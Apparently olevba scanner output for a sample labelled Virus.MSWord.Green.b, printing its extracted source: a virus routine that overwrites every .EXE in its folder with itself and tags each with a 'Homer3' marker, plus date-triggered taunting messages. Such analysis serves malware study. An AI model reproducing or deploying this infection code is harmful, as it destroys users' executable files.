olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Green.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Green.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.Green.b - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
 Dim erej() As Byte
 Dim zrtva As String
 Const velicina As Integer = 24576
 Dim inf_znak As String
 Dim homer As String
 Private Sub Form_Load(): On Error Resume Next: GoTo a
a: Dim Free: GoTo b
b: Free = FreeFile: GoTo c
c: Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #Free: GoTo d
d: ReDim erej(velicina): GoTo e
e: Get #1, 1, erej: GoTo f
f: Close #Free: GoTo g
h: While zrtva <> "": GoTo k
g: zrtva = Dir(App.Path & "\" & "*.EXE"): GoTo h
k: Open App.Path & "\" & zrtva For Binary Access Read As #Free: GoTo l
l: homer = Strings.Space(LOF(Free)): GoTo o
o: Get #1, 1, homer: GoTo p
p: Close #Free: GoTo u
u: inf_znak = Mid(homer, Len(homer)): GoTo z
z: If Strings.LCase(inf_znak) <> "Homer3" Then: GoTo t
t: Open App.Path & "\" & zrtva For Binary Access Write As #Free: GoTo r
r: Put #1, , erej: GoTo w
w: Put #1, , velicina: GoTo q
q: Put #1, LOF(Free) + 6, "Homer3": GoTo s
s: Close #Free: GoTo v
v: zrtva = Dir(): GoTo n
n: Wend
If Day(Now()) = 7 Then
MsgBox "Ja sam Homer Veliki-Qurac!", vbCritical, "| Critical Information |"
If Month(Now()) = 7 Then
MsgBox "Damn! AVP sux!", vbExclamation, "AVP = 0"
'HLLO.Homer_Tha_Pile 3 by e[ax]
 'Greetz to all ppl on #virus
 'Pozdravljam cijeli BiHNet.ORG
 '"My Dream Is My Reality"
End If: End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
+----------+--------------------+---------------------------------------------+

